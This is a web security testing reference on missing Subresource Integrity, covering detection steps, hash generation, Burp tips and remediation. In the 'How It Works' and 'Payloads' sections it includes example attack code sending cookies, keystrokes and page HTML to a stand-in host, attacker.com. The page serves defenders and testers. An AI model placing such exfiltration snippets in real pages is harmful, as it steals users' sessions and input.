# Subresource Integrity (SRI) Missing

## Overview
Subresource Integrity (SRI) is a browser security feature that allows developers to specify cryptographic hashes of external scripts and stylesheets. If a loaded resource does not match its expected hash, the browser refuses to execute it. When SRI is absent on externally-loaded scripts (particularly from CDNs or third-party hosts), a compromised CDN, a supply chain attack, or a man-in-the-middle adversary can silently replace the resource with malicious code that executes in the context of the target origin with full DOM access.

## How It Works
Without SRI, the browser trusts any content returned by an external URL:
```html
<!-- Vulnerable: no integrity check -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
```
If the CDN is compromised or the DNS is poisoned, the attacker can serve:
```html
<!-- What the CDN returns instead: malicious code -->
document.location='https://attacker.com/?cookies='+document.cookie;
```
With SRI, the browser computes the hash of the received content and compares it to the expected value:
```html
<script src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-F4BRNtQKe..."
  crossorigin="anonymous"></script>
```
If they differ, the browser blocks the script entirely.

## Impact
- Full XSS in the context of the application if a CDN is compromised (supply chain attack)
- Cookie theft and session hijacking
- Keylogging and form data interception via injected event listeners
- Cryptocurrency mining injected into every page
- Redirection of users to phishing pages
- Data exfiltration from DOM, localStorage, and sessionStorage
- Defacement of web application content
- Pivoting to internal network resources via the browser

## Where to Look
- All `<script src="https://...">` tags loading from external CDNs or third-party domains
- All `<link rel="stylesheet" href="https://...">` loading from external sources
- Resources loaded from `cdnjs.cloudflare.com`, `cdn.jsdelivr.net`, `unpkg.com`, `code.jquery.com`, `stackpath.bootstrapcdn.com`, `maxcdn.bootstrapcdn.com`
- Resources loaded without the `integrity` attribute
- Resources loaded with `integrity` but without `crossorigin="anonymous"` (SRI requires CORS)
- Dynamic `<script>` elements created via JavaScript that load external URLs
- Pages that conditionally load external resources based on user role

## Testing Steps
1. View the page source of every page and grep for external `<script>` and `<link>` tags:
   ```bash
   curl -s https://target.com | grep -Ei '<script.*src=|<link.*href=' | grep -v 'target.com'
   ```
2. For each external resource, check if it has an `integrity` attribute.
3. Also verify the `crossorigin` attribute is set to `anonymous` or `use-credentials` (required for SRI to work).
4. Use the browser DevTools Network tab to catch dynamically-loaded resources not visible in source.
5. Check the Content Security Policy for `require-sri-for script style` directive.
6. Verify that internal first-party resources don't have SRI (SRI is primarily for cross-origin resources).
7. Check if the `integrity` hash actually matches the loaded file by computing it:
   ```bash
   curl -s https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A
   # Compare to the integrity attribute value
   ```
8. Test if the CDN serves different content based on geolocation or headers.
9. Check if build pipelines pin dependency versions consistently.
10. Review package.json / package-lock.json for dependencies pulled from CDNs at runtime.

## Payloads / Techniques

Detecting missing SRI with curl and grep:
```bash
# Extract all external script and link tags
curl -s https://target.com | grep -Eo '<(script|link)[^>]+>' | grep -v 'integrity='

# Or more targeted:
curl -s https://target.com | python3 -c "
import sys, re
html = sys.stdin.read()
tags = re.findall(r'<(?:script|link)[^>]+>', html, re.IGNORECASE)
for t in tags:
    if ('src=' in t or 'href=' in t) and 'integrity=' not in t:
        print('[MISSING SRI]', t)
"
```

Generate correct SRI hash for a resource:
```bash
# SHA-384 (recommended)
curl -s https://cdn.example.com/jquery.min.js | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A | \
  sed 's/^/sha384-/'

# Using shasum
curl -s https://cdn.example.com/jquery.min.js | \
  shasum -a 384 -b | \
  awk '{print $1}' | \
  xxd -r -p | \
  base64
```

Correct HTML with SRI (reference):
```html
<script
  src="https://code.jquery.com/jquery-3.7.1.min.js"
  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"
  crossorigin="anonymous"></script>
```

Checking if crossorigin is set (SRI requires it for cross-origin requests):
```html
<!-- Wrong: integrity without crossorigin — browser may not enforce SRI -->
<script src="https://cdn.example.com/lib.js" integrity="sha384-..."></script>

<!-- Correct: both attributes required for cross-origin SRI -->
<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

Testing for tamperable CDN content (PoC: verify you can serve different content):
```bash
# Check if CDN has version ambiguity
curl -I https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js -H "Accept-Encoding: identity"
# If ETag changes between requests, content may be non-deterministic
```

Hypothetical attack scenario (supply chain):
```javascript
// Injected into jquery.min.js on compromised CDN:
(function(){
  // Original jQuery code...
  // Injected malicious code:
  document.addEventListener('keydown', function(e){
    fetch('https://attacker.com/keylog?k='+e.key);
  });
  setInterval(function(){
    fetch('https://attacker.com/dom?d='+btoa(document.documentElement.innerHTML));
  }, 5000);
})();
```

## Burp Suite Tips
- Use the **Retire.js** Burp extension — it identifies vulnerable JavaScript libraries loaded from CDNs and flags those without SRI.
- In the **Proxy** response view, filter for external script tags and inspect for missing integrity attributes.
- Use **Burp's active scanner** — it includes checks for mixed content and weak CSP, which surface alongside missing SRI.
- The **Content Security Policy Auditor** extension will flag if `require-sri-for` is missing.
- Create a **Passive Scanner rule** (with Burp Pro montoya API) that flags all external script/link tags without `integrity` attributes.

## Tools
- SRI Hash Generator — https://www.srihash.org/
- sri-check (CLI) — validates SRI attributes across a crawled site
- Burp Suite Retire.js extension — detects outdated and unprotected JS libraries
- Snyk — dependency vulnerability scanner with CDN awareness
- helmet.js — Node.js security middleware that can enforce SRI in generated HTML
- webpack-subresource-integrity — Webpack plugin to automatically add SRI hashes to generated script tags
- bundlewatch — tracks bundle integrity in CI/CD pipelines

## Remediation
- Add `integrity` and `crossorigin="anonymous"` attributes to all external `<script>` and `<link rel="stylesheet">` tags.
- Use a build tool plugin (webpack-subresource-integrity, vite-plugin-sri) to automatically generate and embed SRI hashes at build time.
- Implement `Content-Security-Policy: require-sri-for script style;` to enforce SRI browser-side.
- Self-host critical third-party libraries rather than loading from external CDNs when possible.
- Pin dependency versions in package.json and use lockfiles (package-lock.json, yarn.lock) — verify hashes match.
- Establish a process to update SRI hashes whenever a library is upgraded.
- Monitor CDN resources for unexpected changes using a service like Report URI or a periodic hash-check in CI.

## References
https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
https://www.w3.org/TR/SRI/
https://portswigger.net/web-security/cross-site-scripting
https://owasp.org/www-community/controls/Subresource_Integrity
https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html
https://snyk.io/blog/understanding-supply-chain-attacks/
